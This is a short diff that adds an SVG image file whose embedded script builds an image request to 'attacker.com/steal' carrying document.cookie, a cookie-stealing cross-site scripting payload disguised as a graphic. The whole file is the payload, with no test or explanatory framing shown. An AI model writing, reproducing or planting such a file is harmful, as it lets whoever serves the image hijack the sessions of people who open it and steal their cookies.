@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+    <script>
+        var i = new Image();
+        i.src = "http://attacker.com/steal?cookie=" + document.cookie;
+    </script>
+</svg>
